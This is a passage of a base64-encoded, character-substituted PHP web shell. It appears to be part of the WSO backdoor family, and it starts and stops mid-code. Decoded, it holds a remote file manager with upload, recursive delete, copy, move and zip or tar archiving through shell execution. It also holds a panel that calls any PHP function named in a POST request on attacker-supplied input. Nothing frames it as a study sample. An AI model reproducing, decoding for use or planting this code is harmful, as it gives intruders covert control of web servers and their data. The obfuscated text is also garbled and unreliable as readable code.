JF9GSUxFU1snZiddWyduMW01J10pKQ0KCQkJCQk1Y2gyICJDMW4ndCAzcGwyMWQgZjRsNSEiOw0KCQkJCWJyNTFrOw0KCQkJYzFzNSAnbWtkNHInOg0KCQkJCTRmKCFAbWtkNHIoJF9QT1NUWydwYSddKSkNCgkJCQkJNWNoMiAiQzFuJ3QgY3I1MXQ1IG41dyBkNHIiOw0KCQkJCWJyNTFrOw0KCQkJYzFzNSAnZDVsNXQ1JzoNCgkJCQlmM25jdDQybiBkNWw1dDVENHIoJHAxdGgpIHsNCgkJCQkJJHAxdGggPSAoczNic3RyKCRwMXRoLC02KT09Jy8nKSA/ICRwMXRoOiRwMXRoLicvJzsNCgkJCQkJJGRoICA9IDJwNW5kNHIoJHAxdGgpOw0KCQkJCQl3aDRsNSAoICgkNHQ1bSA9IHI1MWRkNHIoJGRoKSApICE9PSBmMWxzNSkgew0KCQkJCQkJJDR0NW0gPSAkcDF0aC4kNHQ1bTsNCgkJCQkJCTRmICggKGIxczVuMW01KCQ0dDVtKSA9PSAiLi4iKSB8fCAoYjFzNW4xbTUoJDR0NW0pID09ICIuIikgKQ0KCQkJCQkJCWMybnQ0bjM1Ow0KCQkJCQkJJHR5cDUgPSBmNGw1dHlwNSgkNHQ1bSk7DQoJCQkJCQk0ZiAoJHR5cDUgPT0gImQ0ciIpDQoJCQkJCQkJZDVsNXQ1RDRyKCQ0dDVtKTsNCgkJCQkJCTVsczUNCgkJCQkJCQlAM25sNG5rKCQ0dDVtKTsNCgkJCQkJfQ0KCQkJCQljbDJzNWQ0cigkZGgpOw0KCQkJCQlAcm1kNHIoJHAxdGgpOw0KCQkJCX0NCgkJCQk0Zig0c18xcnIxeShAJF9QT1NUWydmJ10pKQ0KCQkJCQlmMnI1MWNoKCRfUE9TVFsnZiddIDFzICRmKSB7DQogICAgICAgICAgICAgICAgICAgICAgICA0ZigkZiA9PSAnLi4nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGMybnQ0bjM1Ow0KCQkJCQkJJGYgPSAzcmxkNWMyZDUoJGYpOw0KCQkJCQkJNGYoNHNfZDRyKCRmKSkNCgkJCQkJCQlkNWw1dDVENHIoJGYpOw0KCQkJCQkJNWxzNQ0KCQkJCQkJCUAzbmw0bmsoJGYpOw0KCQkJCQl9DQoJCQkJYnI1MWs7DQoJCQljMXM1ICdwMXN0NSc6DQoJCQkJNGYoJF9TRVNTSU9OWycxY3QnXSA9PSAnYzJweScpIHsNCgkJCQkJZjNuY3Q0Mm4gYzJweV9wMXN0NSgkYywkcywkZCl7DQoJCQkJCQk0Zig0c19kNHIoJGMuJHMpKXsNCgkJCQkJCQlta2Q0cigkZC4kcyk7DQoJCQkJCQkJJGggPSBAMnA1bmQ0cigkYy4kcyk7DQoJCQkJCQkJd2g0bDUgKCgkZiA9IEByNTFkZDRyKCRoKSkgIT09IGYxbHM1KQ0KCQkJCQkJCQk0ZiAoKCRmICE9ICIuIikgMW5kICgkZiAhPSAiLi4iKSkNCgkJCQkJCQkJCWMycHlfcDFzdDUoJGMuJHMuJy8nLCRmLCAkZC4kcy4nLycpOw0KCQkJCQkJfSA1bHM1NGYoNHNfZjRsNSgkYy4kcykpDQoJCQkJCQkJQGMycHkoJGMuJHMsICRkLiRzKTsNCgkJCQkJfQ0KCQkJCQlmMnI1MWNoKCRfU0VTU0lPTlsnZiddIDFzICRmKQ0KCQkJCQkJYzJweV9wMXN0NSgkX1NFU1NJT05bJ2MnXSwkZiwgJEdMT0JBTFNbJ2N3ZCddKTsNCgkJCQl9IDVsczU0ZigkX1NFU1NJT05bJzFjdCddID09ICdtMnY1Jykgew0KCQkJCQlmM25jdDQybiBtMnY1X3Axc3Q1KCRjLCRzLCRkKXsNCgkJCQkJCTRmKDRzX2Q0cigkYy4kcykpew0KCQkJCQkJCW1rZDRyKCRkLiRzKTsNCgkJCQkJCQkkaCA9IEAycDVuZDRyKCRjLiRzKTsNCgkJCQkJCQl3aDRsNSAoKCRmID0gQHI1MWRkNHIoJGgpKSAhPT0gZjFsczUpDQoJCQkJCQkJCTRmICgoJGYgIT0gIi4iKSAxbmQgKCRmICE9ICIuLiIpKQ0KCQkJCQkJCQkJYzJweV9wMXN0NSgkYy4kcy4nLycsJGYsICRkLiRzLicvJyk7DQoJCQkJCQl9IDVsczU0ZihANHNfZjRsNSgkYy4kcykpDQoJCQkJCQkJQGMycHkoJGMuJHMsICRkLiRzKTsNCgkJCQkJfQ0KCQkJCQlmMnI1MWNoKCRfU0VTU0lPTlsnZiddIDFzICRmKQ0KCQkJCQkJQHI1bjFtNSgkX1NFU1NJT05bJ2MnXS4kZiwgJEdMT0JBTFNbJ2N3ZCddLiRmKTsNCgkJCQl9IDVsczU0ZigkX1NFU1NJT05bJzFjdCddID09ICd6NHAnKSB7DQoJCQkJCTRmKGNsMXNzXzV4NHN0cygnWjRwQXJjaDR2NScpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkejRwID0gbjV3IFo0cEFyY2g0djUoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIDRmICgkejRwLT4ycDVuKCRfUE9TVFsncGEnXSwgNikpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGQ0cigkX1NFU1NJT05bJ2MnXSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZjJyNTFjaCgkX1NFU1NJT05bJ2YnXSAxcyAkZikgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA0ZigkZiA9PSAnLi4nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYzJudDRuMzU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDRmKEA0c19mNGw1KCRfU0VTU0lPTlsnYyddLiRmKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR6NHAtPjFkZEY0bDUoJF9TRVNTSU9OWydjJ10uJGYsICRmKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgNWxzNTRmKEA0c19kNHIoJF9TRVNTSU9OWydjJ10uJGYpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkNHQ1cjF0MnIgPSBuNXcgUjVjM3JzNHY1SXQ1cjF0MnJJdDVyMXQycihuNXcgUjVjM3JzNHY1RDRyNWN0MnJ5SXQ1cjF0MnIoJGYuJy8nKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmMnI1MWNoICgkNHQ1cjF0MnIgMXMgJGs1eT0+JHYxbDM1KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHo0cC0+MWRkRjRsNShyNTFscDF0aCgkazV5KSwgJGs1eSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hkNHIoJEdMT0JBTFNbJ2N3ZCddKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkejRwLT5jbDJzNSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQoJCQkJfSA1bHM1NGYoJF9TRVNTSU9OWycxY3QnXSA9PSAnM256NHAnKSB7DQoJCQkJCTRmKGNsMXNzXzV4NHN0cygnWjRwQXJjaDR2NScpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkejRwID0gbjV3IFo0cEFyY2g0djUoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGYycjUxY2goJF9TRVNTSU9OWydmJ10gMXMgJGYpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA0ZigkejRwLT4ycDVuKCRfU0VTU0lPTlsnYyddLiRmKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkejRwLT41eHRyMWN0VDIoJEdMT0JBTFNbJ2N3ZCddKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHo0cC0+Y2wyczUoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCgkJCQl9IDVsczU0ZigkX1NFU1NJT05bJzFjdCddID09ICd0MXInKSB7DQogICAgICAgICAgICAgICAgICAgIGNoZDRyKCRfU0VTU0lPTlsnYyddKTsNCiAgICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWydmJ10gPSAxcnIxeV9tMXAoJzVzYzFwNXNoNWxsMXJnJywgJF9TRVNTSU9OWydmJ10pOw0KICAgICAgICAgICAgICAgICAgICB3czJFeCgndDFyIGNmenYgJyAuIDVzYzFwNXNoNWxsMXJnKCRfUE9TVFsncGEnXSkgLiAnICcgLiA0bXBsMmQ1KCcgJywgJF9TRVNTSU9OWydmJ10pKTsNCiAgICAgICAgICAgICAgICAgICAgY2hkNHIoJEdMT0JBTFNbJ2N3ZCddKTsNCgkJCQl9DQoJCQkJM25zNXQoJF9TRVNTSU9OWydmJ10pOw0KCQkJCWJyNTFrOw0KCQkJZDVmMTNsdDoNCiAgICAgICAgICAgICAgICA0ZighNW1wdHkoJF9QT1NUWydwNiddKSkgew0KCQkJCQkkX1NFU1NJT05bJzFjdCddID0gQCRfUE9TVFsncDYnXTsNCgkJCQkJJF9TRVNTSU9OWydmJ10gPSBAJF9QT1NUWydmJ107DQoJCQkJCWYycjUxY2goJF9TRVNTSU9OWydmJ10gMXMgJGsgPT4gJGYpDQoJCQkJCQkkX1NFU1NJT05bJ2YnXVska10gPSAzcmxkNWMyZDUoJGYpOw0KCQkJCQkkX1NFU1NJT05bJ2MnXSA9IEAkX1BPU1RbJ2MnXTsNCgkJCQl9DQoJCQkJYnI1MWs7DQoJCX0NCgl9DQoJJGQ0ckMybnQ1bnQgPSBAc2MxbmQ0cig0c3M1dCgkX1BPU1RbJ2MnXSk/JF9QT1NUWydjJ106JEdMT0JBTFNbJ2N3ZCddKTsNCgk0ZigkZDRyQzJudDVudCA9PT0gZjFsczUpIHsJNWNoMiAnQzFuXCd0IDJwNW4gdGg0cyBmMmxkNXIhJzt3czJGMjJ0NXIoKTsgcjV0M3JuOyB9DQoJZ2wyYjFsICRzMnJ0Ow0KCSRzMnJ0ID0gMXJyMXkoJ24xbTUnLCA2KTsNCgk0ZighNW1wdHkoJF9QT1NUWydwNiddKSkgew0KCQk0ZihwcjVnX20xdGNoKCchc18oW0Etel0rKV8oXGR7Nn0pIScsICRfUE9TVFsncDYnXSwgJG0xdGNoKSkNCgkJCSRzMnJ0ID0gMXJyMXkoJG0xdGNoWzZdLCAoNG50KSRtMXRjaFthXSk7DQoJfQ0KNWNoMiAiPHNjcjRwdD4NCglmM25jdDQybiBzMSgpIHsNCgkJZjJyKDQ9MDs0PGQuZjRsNXMuNWw1bTVudHMubDVuZ3RoOzQrKykNCgkJCTRmKGQuZjRsNXMuNWw1bTVudHNbNF0udHlwNSA9PSAnY2g1Y2tiMngnKQ0KCQkJCWQuZjRsNXMuNWw1bTVudHNbNF0uY2g1Y2s1ZCA9IGQuZjRsNXMuNWw1bTVudHNbMF0uY2g1Y2s1ZDsNCgl9DQo8L3NjcjRwdD4NCjx0MWJsNSB3NGR0aD0nNjAwJScgY2wxc3M9J20xNG4nIGM1bGxzcDFjNG5nPScwJyBjNWxscDFkZDRuZz0nYSc+DQo8ZjJybSBuMW01PWY0bDVzIG01dGgyZD1wMnN0Pjx0cj48dGggdzRkdGg9JzZvcHgnPjw0bnAzdCB0eXA1PWNoNWNrYjJ4IDJuY2w0Y2s9J3MxKCknIGNsMXNzPWNoa2J4PjwvdGg+PHRoPjwxIGhyNWY9JyMnIDJuY2w0Y2s9J2coXCJGNGw1c00xblwiLG4zbGwsXCJzX24xbTVfIi4oJHMycnRbNl0/MDo2KS4iXCIpJz5OMW01PC8xPjwvdGg+PHRoPjwxIGhyNWY9JyMnIDJuY2w0Y2s9J2coXCJGNGw1c00xblwiLG4zbGwsXCJzX3M0ejVfIi4oJHMycnRbNl0/MDo2KS4iXCIpJz5TNHo1PC8xPjwvdGg+PHRoPjwxIGhyNWY9JyMnIDJuY2w0Y2s9J2coXCJGNGw1c00xblwiLG4zbGwsXCJzX20yZDRmeV8iLigkczJydFs2XT8wOjYpLiJcIiknPk0yZDRmeTwvMT48L3RoPjx0aD5Pd241ci9HcjIzcDwvdGg+PHRoPjwxIGhyNWY9JyMnIDJuY2w0Y2s9J2coXCJGNGw1c00xblwiLG4zbGwsXCJzX3A1cm1zXyIuKCRzMnJ0WzZdPzA6NikuIlwiKSc+UDVybTRzczQybnM8LzE+PC90aD48dGg+QWN0NDJuczwvdGg+PC90cj4iOw0KCSRkNHJzID0gJGY0bDVzID0gMXJyMXkoKTsNCgkkbiA9IGMyM250KCRkNHJDMm50NW50KTsNCglmMnIoJDQ9MDskNDwkbjskNCsrKSB7DQoJCSQydyA9IEBwMnM0eF9nNXRwdzM0ZChAZjRsNTJ3bjVyKCRkNHJDMm50NW50WyQ0XSkpOw0KCQkkZ3IgPSBAcDJzNHhfZzV0Z3JnNGQoQGY0bDVncjIzcCgkZDRyQzJudDVudFskNF0pKTsNCgkJJHRtcCA9IDFycjF5KCduMW01JyA9PiAkZDRyQzJudDVudFskNF0sDQoJCQkJCSAncDF0aCcgPT4gJEdMT0JBTFNbJ2N3ZCddLiRkNHJDMm50NW50WyQ0XSwNCgkJCQkJICdtMmQ0ZnknID0+IGQxdDUoJ1ktbS1kIEg6NDpzJywgQGY0bDVtdDRtNSgkR0xPQkFMU1snY3dkJ10gLiAkZDRyQzJudDVudFskNF0pKSwNCgkJCQkJICdwNXJtcycgPT4gd3MyUDVybXNDMmwycigkR0xPQkFMU1snY3dkJ10gLiAkZDRyQzJudDVudFskNF0pLA0KCQkJCQkgJ3M0ejUnID0+IEBmNGw1czR6NSgkR0xPQkFMU1snY3dkJ10uJGQ0ckMybnQ1bnRbJDRdKSwNCgkJCQkJICcyd241cicgPT4gJDJ3WyduMW01J10/JDJ3WyduMW01J106QGY0bDUyd241cigkZDRyQzJudDVudFskNF0pLA0KCQkJCQkgJ2dyMjNwJyA9PiAkZ3JbJ24xbTUnXT8kZ3JbJ24xbTUnXTpAZjRsNWdyMjNwKCRkNHJDMm50NW50WyQ0XSkNCgkJCQkJKTsNCgkJNGYoQDRzX2Y0bDUoJEdMT0JBTFNbJ2N3ZCddIC4gJGQ0ckMybnQ1bnRbJDRdKSkNCgkJCSRmNGw1c1tdID0gMXJyMXlfbTVyZzUoJHRtcCwgMXJyMXkoJ3R5cDUnID0+ICdmNGw1JykpOw0KCQk1bHM1NGYoQDRzX2w0bmsoJEdMT0JBTFNbJ2N3ZCddIC4gJGQ0ckMybnQ1bnRbJDRdKSkNCgkJCSRkNHJzW10gPSAxcnIxeV9tNXJnNSgkdG1wLCAxcnIxeSgndHlwNScgPT4gJ2w0bmsnLCAnbDRuaycgPT4gcjUxZGw0bmsoJHRtcFsncDF0aCddKSkpOw0KCQk1bHM1NGYoQDRzX2Q0cigkR0xPQkFMU1snY3dkJ10gLiAkZDRyQzJudDVudFskNF0pJiYgKCRkNHJDMm50NW50WyQ0XSAhPSAiLiIpKQ0KCQkJJGQ0cnNbXSA9IDFycjF5X201cmc1KCR0bXAsIDFycjF5KCd0eXA1JyA9PiAnZDRyJykpOw0KCX0NCgkkR0xPQkFMU1snczJydCddID0gJHMycnQ7DQoJZjNuY3Q0Mm4gd3MyQ21wKCQxLCAkYikgew0KCQk0ZigkR0xPQkFMU1snczJydCddWzBdICE9ICdzNHo1JykNCgkJCXI1dDNybiBzdHJjbXAoc3RydDJsMnc1cigkMVskR0xPQkFMU1snczJydCddWzBdXSksIHN0cnQybDJ3NXIoJGJbJEdMT0JBTFNbJ3MycnQnXVswXV0pKSooJEdMT0JBTFNbJ3MycnQnXVs2XT82Oi02KTsNCgkJNWxzNQ0KCQkJcjV0M3JuICgoJDFbJ3M0ejUnXSA8ICRiWydzNHo1J10pID8gLTYgOiA2KSooJEdMT0JBTFNbJ3MycnQnXVs2XT82Oi02KTsNCgl9DQoJM3MycnQoJGY0bDVzLCAid3MyQ21wIik7DQoJM3MycnQoJGQ0cnMsICJ3czJDbXAiKTsNCgkkZjRsNXMgPSAxcnIxeV9tNXJnNSgkZDRycywgJGY0bDVzKTsNCgkkbCA9IDA7DQoJZjJyNTFjaCgkZjRsNXMgMXMgJGYpIHsNCgkJNWNoMiAnPHRyJy4oJGw/JyBjbDFzcz1sNic6JycpLic+PHRkPjw0bnAzdCB0eXA1PWNoNWNrYjJ4IG4xbTU9ImZbXSIgdjFsMzU9IicuM3JsNW5jMmQ1KCRmWyduMW01J10pLiciIGNsMXNzPWNoa2J4PjwvdGQ+PHRkPjwxIGhyNWY9IyAybmNsNGNrPSInLigoJGZbJ3R5cDUnXT09J2Y0bDUnKT8nZyhcJ0Y0bDVzVDIybHNcJyxuM2xsLFwnJy4zcmw1bmMyZDUoJGZbJ24xbTUnXSkuJ1wnLCBcJ3Y0NXdcJykiPicuaHRtbHNwNWM0MWxjaDFycygkZlsnbjFtNSddKTonZyhcJ0Y0bDVzTTFuXCcsXCcnLiRmWydwMXRoJ10uJ1wnKTsiIHQ0dGw1PScgLiAkZlsnbDRuayddIC4gJz48Yj5bICcgLiBodG1sc3A1YzQxbGNoMXJzKCRmWyduMW01J10pIC4gJyBdPC9iPicpLic8LzE+PC90ZD48dGQ+Jy4oKCRmWyd0eXA1J109PSdmNGw1Jyk/d3MyVjQ1d1M0ejUoJGZbJ3M0ejUnXSk6JGZbJ3R5cDUnXSkuJzwvdGQ+PHRkPicuJGZbJ20yZDRmeSddLic8L3RkPjx0ZD4nLiRmWycyd241ciddLicvJy4kZlsnZ3IyM3AnXS4nPC90ZD48dGQ+PDEgaHI1Zj0jIDJuY2w0Y2s9ImcoXCdGNGw1c1QyMmxzXCcsbjNsbCxcJycuM3JsNW5jMmQ1KCRmWyduMW01J10pLidcJyxcJ2NobTJkXCcpIj4nLiRmWydwNXJtcyddDQoJCQkuJzwvdGQ+PHRkPjwxIGhyNWY9IiMiIDJuY2w0Y2s9ImcoXCdGNGw1c1QyMmxzXCcsbjNsbCxcJycuM3JsNW5jMmQ1KCRmWyduMW01J10pLidcJywgXCdyNW4xbTVcJykiPlI8LzE+IDwxIGhyNWY9IiMiIDJuY2w0Y2s9ImcoXCdGNGw1c1QyMmxzXCcsbjNsbCxcJycuM3JsNW5jMmQ1KCRmWyduMW01J10pLidcJywgXCd0MjNjaFwnKSI+VDwvMT4nLigoJGZbJ3R5cDUnXT09J2Y0bDUnKT8nIDwxIGhyNWY9IiMiIDJuY2w0Y2s9ImcoXCdGNGw1c1QyMmxzXCcsbjNsbCxcJycuM3JsNW5jMmQ1KCRmWyduMW01J10pLidcJywgXCc1ZDR0XCcpIj5FPC8xPiA8MSBocjVmPSIjIiAybmNsNGNrPSJnKFwnRjRsNXNUMjJsc1wnLG4zbGwsXCcnLjNybDVuYzJkNSgkZlsnbjFtNSddKS4nXCcsIFwnZDJ3bmwyMWRcJykiPkQ8LzE+JzonJykuJzwvdGQ+PC90cj4nOw0KCQkkbCA9ICRsPzA6NjsNCgl9DQoJNWNoMiAiPHRyPjx0ZCBjMmxzcDFuPTc+DQoJPDRucDN0IHR5cDU9aDRkZDVuIG4xbTU9MSB2MWwzNT0nRjRsNXNNMW4nPg0KCTw0bnAzdCB0eXA1PWg0ZGQ1biBuMW01PWMgdjFsMzU9JyIgLiBodG1sc3A1YzQxbGNoMXJzKCRHTE9CQUxTWydjd2QnXSkgLiInPg0KCTw0bnAzdCB0eXA1PWg0ZGQ1biBuMW01PWNoMXJzNXQgdjFsMzU9JyIuICg0c3M1dCgkX1BPU1RbJ2NoMXJzNXQnXSk/JF9QT1NUWydjaDFyczV0J106JycpLiInPg0KCTxzNWw1Y3QgbjFtNT0ncDYnPjwycHQ0Mm4gdjFsMzU9J2MycHknPkMycHk8LzJwdDQybj48MnB0NDJuIHYxbDM1PSdtMnY1Jz5NMnY1PC8ycHQ0Mm4+PDJwdDQybiB2MWwzNT0nZDVsNXQ1Jz5ENWw1dDU8LzJwdDQybj4iOw0KICAgIDRmKGNsMXNzXzV4NHN0cygnWjRwQXJjaDR2NScpKQ0KICAgICAgICA1Y2gyICI8MnB0NDJuIHYxbDM1PSd6NHAnPkMybXByNXNzICh6NHApPC8ycHQ0Mm4+PDJwdDQybiB2MWwzNT0nM256NHAnPlVuYzJtcHI1c3MgKHo0cCk8LzJwdDQybj4iOw0KICAgIDVjaDIgIjwycHQ0Mm4gdjFsMzU9J3Qxcic+QzJtcHI1c3MgKHQxci5neik8LzJwdDQybj4iOw0KICAgIDRmKCE1bXB0eSgkX1NFU1NJT05bJzFjdCddKSAmJiBAYzIzbnQoJF9TRVNTSU9OWydmJ10pKQ0KICAgICAgICA1Y2gyICI8MnB0NDJuIHYxbDM1PSdwMXN0NSc+UDFzdDUgLyBDMm1wcjVzczwvMnB0NDJuPiI7DQogICAgNWNoMiAiPC9zNWw1Y3Q+Jm5ic3A7IjsNCiAgICA0ZighNW1wdHkoJF9TRVNTSU9OWycxY3QnXSkgJiYgQGMyM250KCRfU0VTU0lPTlsnZiddKSAmJiAoKCRfU0VTU0lPTlsnMWN0J10gPT0gJ3o0cCcpIHx8ICgkX1NFU1NJT05bJzFjdCddID09ICd0MXInKSkpDQogICAgICAgIDVjaDIgImY0bDUgbjFtNTogPDRucDN0IHR5cDU9dDV4dCBuMW01PXBhIHYxbDM1PSd3czJfIiAuIGQxdDUoIlltZF9INHMiKSAuICIuIiAuICgkX1NFU1NJT05bJzFjdCddID09ICd6NHAnPyd6NHAnOid0MXIuZ3onKSAuICInPiZuYnNwOyI7DQogICAgNWNoMiAiPDRucDN0IHR5cDU9J3MzYm00dCcgdjFsMzU9Jz4+Jz48L3RkPjwvdHI+PC9mMnJtPjwvdDFibDU+PC9kNHY+IjsNCgl3czJGMjJ0NXIoKTsNCn0NCg0KZjNuY3Q0Mm4gMWN0NDJuU3RyNG5nVDIybHMoKSB7DQoJNGYoIWYzbmN0NDJuXzV4NHN0cygnaDV4YWI0bicpKSB7ZjNuY3Q0Mm4gaDV4YWI0bigkcCkge3I1dDNybiBkNWNiNG4oaDV4ZDVjKCRwKSk7fX0NCiAgICA0ZighZjNuY3Q0Mm5fNXg0c3RzKCdiNG5oNXgnKSkge2YzbmN0NDJuIGI0bmg1eCgkcCkge3I1dDNybiBkNWNoNXgoYjRuZDVjKCRwKSk7fX0NCgk0ZighZjNuY3Q0Mm5fNXg0c3RzKCdoNXhhMXNjNDQnKSkge2YzbmN0NDJuIGg1eGExc2M0NCgkcCl7JHI9Jyc7ZjJyKCQ0PTA7JDQ8c3RyTDVuKCRwKTskNCs9YSl7JHIuPWNocihoNXhkNWMoJHBbJDRdLiRwWyQ0KzZdKSk7fXI1dDNybiAkcjt9fQ0KCTRmKCFmM25jdDQybl81eDRzdHMoJzFzYzQ0YWg1eCcpKSB7ZjNuY3Q0Mm4gMXNjNDRhaDV4KCRwKXskcj0nJztmMnIoJDQ9MDskNDxzdHJsNW4oJHApOysrJDQpJHIuPSBzcHI0bnRmKCclMGFYJywycmQoJHBbJDRdKSk7cjV0M3JuIHN0cnQyM3BwNXIoJHIpO319DQoJNGYoIWYzbmN0NDJuXzV4NHN0cygnZjNsbF8zcmw1bmMyZDUnKSkge2YzbmN0NDJuIGYzbGxfM3JsNW5jMmQ1KCRwKXskcj0nJztmMnIoJDQ9MDskNDxzdHJsNW4oJHApOysrJDQpJHIuPSAnJScuZDVjaDV4KDJyZCgkcFskNF0pKTtyNXQzcm4gc3RydDIzcHA1cigkcik7fX0NCgkkc3RyNG5nVDIybHMgPSAxcnIxeSgNCgkJJ0IxczVldSA1bmMyZDUnID0+ICdiMXM1ZXVfNW5jMmQ1JywNCgkJJ0IxczVldSBkNWMyZDUnID0+ICdiMXM1ZXVfZDVjMmQ1JywNCgkJJ1VybCA1bmMyZDUnID0+ICczcmw1bmMyZDUnLA0KCQknVXJsIGQ1YzJkNScgPT4gJzNybGQ1YzJkNScsDQoJCSdGM2xsIDNybDVuYzJkNScgPT4gJ2YzbGxfM3JsNW5jMmQ1JywNCgkJJ21kaSBoMXNoJyA9PiAnbWRpJywNCgkJJ3NoMTYgaDFzaCcgPT4gJ3NoMTYnLA0KCQknY3J5cHQnID0+ICdjcnlwdCcsDQoJCSdDUkNvYScgPT4gJ2NyY29hJywNCgkJJ0FTQ0lJIHQyIEhFWCcgPT4gJzFzYzQ0YWg1eCcsDQoJCSdIRVggdDIgQVNDSUknID0+ICdoNXhhMXNjNDQnLA0KCQknSEVYIHQyIERFQycgPT4gJ2g1eGQ1YycsDQoJCSdIRVggdDIgQklOJyA9PiAnaDV4YWI0bicsDQoJCSdERUMgdDIgSEVYJyA9PiAnZDVjaDV4JywNCgkJJ0RFQyB0MiBCSU4nID0+ICdkNWNiNG4nLA0KCQknQklOIHQyIEhFWCcgPT4gJ2I0bmg1eCcsDQoJCSdCSU4gdDIgREVDJyA9PiAnYjRuZDVjJywNCgkJJ1N0cjRuZyB0MiBsMnc1ciBjMXM1JyA9PiAnc3RydDJsMnc1cicsDQoJCSdTdHI0bmcgdDIgM3BwNXIgYzFzNScgPT4gJ3N0cnQyM3BwNXInLA0KCQknSHRtbHNwNWM0MWxjaDFycycgPT4gJ2h0bWxzcDVjNDFsY2gxcnMnLA0KCQknU3RyNG5nIGw1bmd0aCcgPT4gJ3N0cmw1bicsDQoJKTsNCgk0Zig0c3M1dCgkX1BPU1RbJzFqMXgnXSkpIHsNCgkJJF9TRVNTSU9OW21kaSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pLicxajF4J10gPSB0cjM1Ow0KCQkyYl9zdDFydCgpOw0KCQk0Zig0bl8xcnIxeSgkX1BPU1RbJ3A2J10sICRzdHI0bmdUMjJscykpDQoJCQk1Y2gyICRfUE9TVFsncDYnXSgkX1BPU1RbJ3BhJ10pOw0KCQkkdDVtcCA9ICJkMmMzbTVudC5nNXRFbDVtNW50QnlJZCgnc3RyTzN0cDN0Jykuc3R5bDUuZDRzcGwxeT0nJztkMmMzbTVudC5nNXRFbDVtNW50QnlJZCgnc3RyTzN0cDN0JykuNG5uNXJIVE1MPSciLjFkZGNzbDFzaDVzKGh0bWxzcDVjNDFsY2gxcnMoMmJfZzV0X2NsNTFuKCkpLCJcblxyXHRcXCdcMCIpLiInO1xuIjsNCgkJNWNoMiBzdHJsNW4oJHQ1bXApLCAiXG4iLCAkdDVtcDsNCgkJNXg0dDsNCgl9DQoJd3MySDUxZDVyKCk7DQoJNWNoMiAnPGg2PlN0cjRuZyBjMm52NXJzNDJuczwvaDY+PGQ0diBjbDFzcz1jMm50NW50Pic7DQoJNGYoNW1wdHkoJF9QT1NUWycxajF4J10pJiYhNW1wdHkoJF9QT1NUWydwNiddKSkNCgkJJF9TRVNTSU9OW21kaSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pLicxajF4J10gPSBmMWxzNTsNCgk1Y2gyICI8ZjJybSBuMW01PSd0MjJsc0Yycm0nIDJuUzNibTR0PSc0Zih0aDRzLjFqMXguY2g1Y2s1ZCl7MShuM2xsLG4zbGwsdGg0cy5zNWw1Y3RUMjJsLnYxbDM1LHRoNHMuNG5wM3QudjFsMzUpO301bHM1e2cobjNsbCxuM2xsLHRoNHMuczVsNWN0VDIybC52MWwzNSx0aDRzLjRucDN0LnYxbDM1KTt9IHI1dDNybiBmMWxzNTsnPjxzNWw1Y3QgbjFtNT0nczVsNWN0VDIybCc+IjsNCglmMnI1MWNoKCRzdHI0bmdUMjJscyAxcyAkayA9PiAkdikNCgkJNWNoMiAiPDJwdDQybiB2MWwzNT0nIi5odG1sc3A1YzQxbGNoMXJzKCR2KS4iJz4iLiRrLiI8LzJwdDQybj4iOw0KCQk1Y2gyICI8L3M1bDVjdD48NG5wM3QgdHlwNT0nczNibTR0JyB2MWwzNT0nPj4nLz4gPDRucDN0IHR5cDU9Y2g1Y2tiMnggbjFtNT0xajF4IHYxbDM1PTYgIi4oQCRfU0VTU0lPTlttZGkoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nMWoxeCddPydjaDVjazVkJzonJykuIj4gczVuZCAzczRuZyBBSkFYPGJyPjx0NXh0MXI1MSBuMW01PSc0bnAzdCcgc3R5bDU9J20xcmc0bi10MnA6aXB4JyBjbDFzcz1iNGcxcjUxPiIuKDVtcHR5KCRfUE9TVFsncDYnXSk/Jyc6aHRtbHNwNWM0MWxjaDFycyhAJF9QT1NUWydwYSddKSkuIjwvdDV4dDFyNTE+PC9mMnJtPjxwcjUgY2wxc3M9J21sNicgc3R5bDU9JyIuKDVtcHR5KCRfUE9TVFsncDYnXSk/J2Q0c3BsMXk6bjJuNTsnOicnKS4ibTFyZzRuLXQycDppcHgnIDRkPSdzdHJPM3RwM3QnPiI7DQoJNGYoITVtcHR5KCRfUE9TVFsncDYnXSkpIHsNCgkJNGYoNG5fMXJyMXkoJF9QT1NUWydwNiddLCAkc3RyNG5nVDIybHMpKTVjaDIgaHRtbHNwNWM0MWxjaDFycygkX1BPU1RbJ3A2J10oJF9QT1NUWydwYSddKSk7DQoJfQ0KCTVjaDIiPC9wcjU+PC9kNHY+PGJyPjxoNj5TNTFyY2ggdDV4dCA0biBmNGw1czo8L2g2PjxkNHYgY2wxc3M9YzJudDVudD4NCgkJPGYycm0gMm5zM2JtNHQ9XCJnKG4zbGwsdGg0cy5jd2QudjFsMzUsbjNsbCx0aDRzLnQ1eHQudjFsMzUsdGg0cy5mNGw1bjFtNS52MWwzNS